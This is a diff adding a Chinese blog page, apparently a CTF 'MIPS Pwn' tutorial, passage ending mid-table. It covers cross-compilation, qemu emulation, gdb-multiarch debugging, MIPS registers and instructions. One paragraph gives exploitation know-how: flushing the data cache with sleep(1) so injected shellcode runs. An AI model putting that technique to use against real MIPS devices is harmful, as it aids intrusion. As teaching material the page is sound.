@@ -1,0 +1,1535 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="南行">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介环境搭建编译环境 安装交叉编译工具  安装 MIPS 架构交叉编译工具。 1234567sudo apt updatesudo apt install gcc-mips-linux-gnu binutils-mips-linux-gnusudo apt install gcc-mipsel-linux-gnu binutils-mipsel-linux-gnuapt-get install g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MIPS Pwn">
+<meta property="og:url" content="http://nanhang.top/2025/07/01/ctf/heter/mips/index.html">
+<meta property="og:site_name" content="南行的一座山">
+<meta property="og:description" content="简介环境搭建编译环境 安装交叉编译工具  安装 MIPS 架构交叉编译工具。 1234567sudo apt updatesudo apt install gcc-mips-linux-gnu binutils-mips-linux-gnusudo apt install gcc-mipsel-linux-gnu binutils-mipsel-linux-gnuapt-get install g">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://nanhang.top/assets/Pasted%20image%2020241127190813.png">
+<meta property="og:image" content="http://nanhang.top/assets/Pasted%20image%2020241209212922.png">
+<meta property="article:published_time" content="2025-07-01T01:52:01.000Z">
+<meta property="article:modified_time" content="2025-07-01T02:00:50.127Z">
+<meta property="article:author" content="南行">
+<meta property="article:tag" content="异架构">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://nanhang.top/assets/Pasted%20image%2020241127190813.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>MIPS Pwn - 南行的一座山</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nanhang.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="南行的一座山" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>南行的一座山</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/atom.xml" target="_self">
+                <i class="iconfont icon-rss"></i>
+                <span>RSS</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="MIPS Pwn"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-01 09:52" pubdate>
+          2025年7月1日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">MIPS Pwn</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><ul>
+<li>安装交叉编译工具</li>
+</ul>
+<p>安装 MIPS 架构交叉编译工具。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt update<br>sudo apt <span class="hljs-keyword">install </span>gcc-mips-linux-gnu <span class="hljs-keyword">binutils-mips-linux-gnu</span><br><span class="hljs-keyword"></span>sudo apt <span class="hljs-keyword">install </span>gcc-mipsel-linux-gnu <span class="hljs-keyword">binutils-mipsel-linux-gnu</span><br><span class="hljs-keyword"></span>apt-get <span class="hljs-keyword">install </span>gcc-mips-linux-gnu          <span class="hljs-comment">#安装用于编译大端序的MIPS架构的GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mipsel-linux-gnu        <span class="hljs-comment">#安装用于编译小端序的MIPS架构的GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mips64-linux-gnuabi64   <span class="hljs-comment">#安装用于编译大端序的MIPS64位架构的GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mips64el-linux-gnuabi64 <span class="hljs-comment">#安装用于编译大端序的MIPS64位架构的GCC</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>编译流程</li>
+</ul>
+<p>将 MIPS 汇编文件编译为可执行文件。这里我们先要确定需要编译端序的文件架构，然后选择相应的编译工具。</p>
+<p>这里我们以 MIPS 32 位架构小端序为例。</p>
+<ol>
+<li>将汇编文件编译为目标文件</li>
+</ol>
+<p>因为我们需要将汇编文件编译为 MIPS 架构小端序的可执行文件，所以这里选择<code>mipsel</code>即<code>mips</code>架构小端序编译工具，默认为 32 位。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">mipsel-linux-gnu-as <span class="hljs-built_in">demo</span>.s -o <span class="hljs-built_in">demo</span>.o<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>链接目标文件</li>
+</ol>
+<p>将目标文件链接为可执行程序，同样选择相应架构的链接器进行链接。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">mipsel-linux-gnu-ld <span class="hljs-built_in">demo</span>.o -o <span class="hljs-built_in">demo</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>安装动态链接库</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt search &quot;libc6-&quot; | grep &quot;mips&quot;<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="运行和调试环境"><a href="#运行和调试环境" class="headerlink" title="运行和调试环境"></a>运行和调试环境</h3><ul>
+<li>安装 qemu</li>
+</ul>
+<p>我们通过 qemu 来模拟运行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt <span class="hljs-keyword">update</span><br>sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install qemu qemu<span class="hljs-operator">-</span><span class="hljs-keyword">system</span><span class="hljs-operator">-</span>mips qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span> qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span><span class="hljs-operator">-</span><span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>远行流程</li>
+</ul>
+<p>根据可执行文件架构，选择对应的 qemu 来运行。</p>
+<p>例如 MIPS 32位小端序架构，我们可以选择 <code>qemu-mipsel</code> 来运行</p>
+<p>这里还要区分链接方式，如果动态链接则需要指定动态链接库。</p>
+<p><strong>静态链接：</strong></p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-mipsel-<span class="hljs-keyword">static</span> ./demo<br></code></pre></td></tr></table></figure>
+
+<p><strong>动态链接：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-mipsel -L /usr/mipsel-linux-gnu ./demo<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>调试流程</li>
+</ul>
+<p>安装<code>gdb-multiarch</code>来调试异架构程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install  gdb-multiarch<br></code></pre></td></tr></table></figure>
+
+<p>首先我们通过 qemu 以调试模式运行程序，<code>-g</code>参数表示设置为调试模式，<code>1234</code>表示程序映射的端口。</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-mipsel-<span class="hljs-keyword">static</span> -g <span class="hljs-number">1234</span> ./demo<br></code></pre></td></tr></table></figure>
+
+<p>然后运行<code>gdb-multiarch</code>，并根据架构和端序设置参数。</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">gdb-multiarch<br><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">mips</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br></code></pre></td></tr></table></figure>
+
+<p>然后连接映射程序的端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> remote localhost:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a>运行与调试</h2><p>运行动态链接程序，需要通过<code>-L</code>参数指定动态链接库位置。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn<br></code></pre></td></tr></table></figure>
+
+<p>运行静态链接程序，直接使用 qemu 运行即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-mipsel ./pwn<br></code></pre></td></tr></table></figure>
+
+<p>gcc 交叉编译 mips 程序。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mipsel-linux-gnu-gcc vuln.<span class="hljs-keyword">c</span> -o vuln<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>调试</li>
+</ul>
+<p>通过 qemu 运行程序映射到端口，然后通过 gdb 连接调试。</p>
+<p>qemu 将一个 mips 程序运行并映射到 1234 端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-mipsel -L /usr/mipsel-linux-gnu/ -g 1234 ./pwn<br>gdb-multiarch ./pwn -q<br>set architecture mips<br>target remote localhost:1234<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> architecture<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="MIPS-架构知识"><a href="#MIPS-架构知识" class="headerlink" title="MIPS 架构知识"></a>MIPS 架构知识</h2><ul>
+<li><p>MIPS 固定 <code>4</code> 字节指令长度</p>
+</li>
+<li><p>栈是从内存的高地址向低地址方向增长的</p>
+</li>
+<li><p>叶子函数：函数内部没有再调用其他函数</p>
+</li>
+<li><p>非叶子函数：函数内部调用其他函数的函数</p>
+</li>
+<li><p>流水线效应：在分析 MIPS 汇编代码时会发现，其跳转到函数或者分支跳转语句的下一条都是 <code>nop</code> （），这是因为 MIPS 采用了高度的流水线，其中最重要的是跳转指令导致的<strong>分支延迟效应</strong>。在分支跳转语句后面那条语句叫做<strong>分支延迟槽</strong>，当跳转语句刚执行的一瞬间，跳转到的地址刚填充好（填充到程序计数器），<strong>还没有执行程序计数器中存放的指令，分支延迟槽的指令已经被执行了，这就是流水线效应</strong>（几条指令被同时执行，只是处于不同的阶段， <strong>MIPS 不像其他架构那样存在流水线阻塞</strong>），为了避免出现问题，因此在分支跳转语句的下一条指令通常是 <code>nop</code> 指令或者其他有用的指令。</p>
+</li>
+<li><p>缓存刷新机制：<code>MIPS CPUs</code>有两个独立的 <code>cache</code> : <code>指令cache</code> 和 <code>数据cache</code> 。 指令和数据分别在两个不同的缓存中。当缓存满了，会触发 <code>flush</code> , 将数据写回到主内存。攻击者的攻击<code>payload</code> 通常会被应用当做数据来处理，存储在数据缓存中。当 <code>payload</code> 触发漏洞， 劫持程序执行流程的时候，会去执行内存中的 <code>shellcode</code> .如果数据缓存没有触发 <code>flush</code> 的话，<code>shellcode</code> 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 <code>shellcode</code> 的地址处随机的代码，导致不可预知的后果。(通常执行 <code>sleep(1)</code> 刷新)</p>
+</li>
+<li><p>只有特定的指令（如 <code>lw</code> 和 <code>sw</code>）可以访问内存，所有其他操作都在寄存器之间完成。这种设计简化了指令和流水线操作。</p>
+</li>
+</ul>
+<h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>MIPS 有 32 个通用寄存器，其中每个寄存器都是 32 位，用于存储操作数、中间结果、返回地址等。</p>
+<table>
+<thead>
+<tr>
+<th>寄存器编号</th>
+<th>寄存器名称</th>
+<th>寄存器描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td><code>zero</code></td>
+<td>永远为零</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>$at</code></td>
+<td>保留寄存器</td>
+</tr>
+<tr>
+<td>2~3</td>
+<td><code>$v0~$v1</code></td>
+<td>函数返回值</td>
+</tr>
+<tr>
+<td>4~7</td>
+<td><code>a0-a3</code></td>
+<td>函数参数寄存器，不够用堆栈处理</td>
+</tr>
+<tr>
+<td>8~15</td>
+<td><code>t0-t7</code></td>
+<td>临时寄存器</td>
+</tr>
+<tr>
+<td>16~23</td>
+<td><code>$s0~$s7</code></td>
+<td>保存寄存器，用于保存函数调用中的参数和返回值</td>
+</tr>
+<tr>
+<td>24~25</td>
+<td><code>$t8~$t9</code></td>
+<td>临时寄存器</td>
+</tr>
+<tr>
+<td>26~27</td>
+<td><code>$k0~$k1</code></td>
+<td>保留寄存器</td>
+</tr>
+<tr>
+<td>28</td>
+<td><code>$gp</code></td>
+<td>全局指针</td>
+</tr>
+<tr>
+<td>29</td>
+<td><code>$sp</code></td>
+<td>堆栈指针</td>
+</tr>
+<tr>
+<td>30</td>
+<td><code>$fp</code></td>
+<td>保存栈指针</td>
+</tr>
+<tr>
+<td>31</td>
+<td><code>$ra</code></td>
+<td>返回地址</td>
+</tr>
+</tbody></table>
+<p>MIPS 架构中还定义了 3 个特殊的寄存器，分别是<code>PC</code>（程序计数器）、<code>HI</code>（乘除结果高位寄存器）、<code>LO</code>（乘除结果低位寄存器）。</p>
+<h3 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h3><p>MIPS 的指令集采用 3 种主要格式：</p>
+<ol>
+<li><p>R 型指令（Register）</p>
+<ul>
+<li>这种指令格式用于寄存器之间的操作。</li>
+<li>格式：<code>opcode | rs | rt | rd | shamt | funct</code><ul>
+<li>opcode：操作码，指令该指令的操作类型。</li>
+<li>rs,rt：源寄存器。</li>
+<li>rd：目标寄存器。</li>
+<li>shamt：移位操作的位数。</li>
+<li>funct：指定具体操作的附加操作码。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>I 型指令（Immediate）</p>
+<ul>
+<li>这种指令用于处理立即数（常量）和寄存器的操作。</li>
+<li>格式：<code>opcode | rs | rt | immediate</code><ul>
+<li><code>opcode</code>：操作码，指定该指令的操作类型。</li>
+<li><code>rs</code>：源寄存器。</li>
+<li><code>rt</code>：目标寄存器。</li>
+<li><code>immediate</code>：立即数，用于与寄存器中的值进行运算。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>J 型指令（Jump）</p>
+<ul>
+<li>这种指令用于跳转到其他地址。</li>
+<li>格式：<code>opcode | address</code><ul>
+<li><code>opcode</code>：操作码。</li>
+<li><code>address</code>：跳转目标地址。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ol start="4">
+<li>立即数寻址：操作数是位于指令自身中的常数。</li>
+</ol>
+<p>将 <code>$t1</code> 中的值加上常数 10，并存储在 <code>$t0</code> 中</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">addi </span>$<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">t1</span>, <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>寄存器寻址：操作数是寄存器。</li>
+</ol>
+<p>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在 <code>$t0</code> 中</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">add</span> <span class="hljs-variable">$t0</span>, <span class="hljs-variable">$t1</span>, <span class="hljs-variable">$t2</span><br></code></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>基址寻址或偏移寻址：操作数在内存中，其地址是指令中基址寄存器和常数的和，如lw与sw指令。</li>
+</ol>
+<p>从 <code>$t1</code> 中的基址加上偏移量 4 的内存地址处加载数据到 <code>$t0</code> 中，然后将 <code>$t0</code> 的值存储到 <code>$sp</code> 基址减去 8 的内存地址中。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t0</span>, <span class="hljs-number">4</span>($<span class="hljs-built_in">t1</span>)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">t0</span>, -<span class="hljs-number">8</span>($<span class="hljs-built_in">sp</span>)<br></code></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><code>PC</code>相对寻址：地址是<code>PC</code>和指令中常数的和。</li>
+</ol>
+<p>如果 <code>$t0</code> 和 <code>$t1</code> 相等，则跳转到偏移地址处执行</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">beq </span>$<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">t1</span>, offset<br></code></pre></td></tr></table></figure>
+
+<ol start="8">
+<li>伪直接寻址：跳转地址由指令中26字段和PC高位相连而成。</li>
+</ol>
+<p>跳转到目标地址，由 <code>PC</code> 高位与指令中的 26 位目标字段拼接而成</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">j <span class="hljs-keyword">target</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>指令</th>
+<th>功能描述</th>
+<th>示例</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>R 型</strong></td>
+<td><code>add</code></td>
+<td>加法，$rd &#x3D; $rs + $rt</td>
+<td><code>add $t0, $t1, $t2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>sub</code></td>
+<td>减法，$rd &#x3D; $rs - $rt</td>
+<td><code>sub $t0, $t1, $t2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>and</code></td>
+<td>按位与，$rd &#x3D; $rs &amp; $rt</td>
+<td><code>and $t0, $t1, $t2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>or</code></td>
+<td>按位或，$rd &#x3D; $rs</td>
+<td>$rt</td>
+<td><code>or $t0, $t1, $t2</code></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>xor</code></td>
+<td>按位异或，$rd &#x3D; $rs ^ $rt</td>
+<td><code>xor $t0, $t1, $t2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>nor</code></td>
+<td>按位取反或，$rd &#x3D; ~($rs</td>
+<td>$rt)</td>
+<td><code>nor $t0, $t1, $t2</code></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>sll</code></td>
+<td>逻辑左移，$rd &#x3D; $rt &lt;&lt; sa</td>
+<td><code>sll $t0, $t1, 2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>srl</code></td>
+<td>逻辑右移，$rd &#x3D; $rt &gt;&gt; sa</td>
+<td><code>srl $t0, $t1, 2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>sra</code></td>
+<td>算术右移，$rd &#x3D; $rt &gt;&gt; sa</td>
+<td><code>sra $t0, $t1, 2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>slt</code></td>
+<td>小于，$rd &#x3D; ($rs &lt; $rt) ? 1 : 0</td>
+<td><code>slt $t0, $t1, $t2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>R 型</strong></td>
+<td><code>sltu</code></td>
+<td>无符号小于，$rd &#x3D; ($rs &lt; $rt unsigned) ? 1 : 0</td>
+<td><code>sltu $t0, $t1, $t2</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>addi</code></td>
+<td>加法立即数，$rt &#x3D; $rs + imm</td>
+<td><code>addi $t0, $t1, 10</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>addiu</code></td>
+<td>无符号加法立即数，$rt &#x3D; $rs + imm</td>
+<td><code>addiu $t0, $t1, 10</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>andi</code></td>
+<td>按位与立即数，$rt &#x3D; $rs &amp; imm</td>
+<td><code>andi $t0, $t1, 0xFF</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>ori</code></td>
+<td>按位或立即数，$rt &#x3D; $rs</td>
+<td>imm</td>
+<td><code>ori $t0, $t1, 0xFF</code></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>xori</code></td>
+<td>按位异或立即数，$rt &#x3D; $rs ^ imm</td>
+<td><code>xori $t0, $t1, 0xFF</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>slti</code></td>
+<td>小于立即数，$rt &#x3D; ($rs &lt; imm) ? 1 : 0</td>
+<td><code>slti $t0, $t1, 10</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>sltiu</code></td>
+<td>无符号小于立即数，$rt &#x3D; ($rs &lt; imm unsigned) ? 1 : 0</td>
+<td><code>sltiu $t0, $t1, 10</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>lui</code></td>
+<td>加载上半字，$rt &#x3D; imm &lt;&lt; 16</td>
+<td><code>lui $t0, 0x1000</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>lw</code></td>
+<td>从内存加载字（32位）到寄存器 $rt</td>
+<td><code>lw $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>sw</code></td>
+<td>将寄存器 $rt 的值存储到内存中的地址 $t1 + offset</td>
+<td><code>sw $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>lb</code></td>
+<td>从内存加载字节（8位）到寄存器 $rt</td>
+<td><code>lb $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>lbu</code></td>
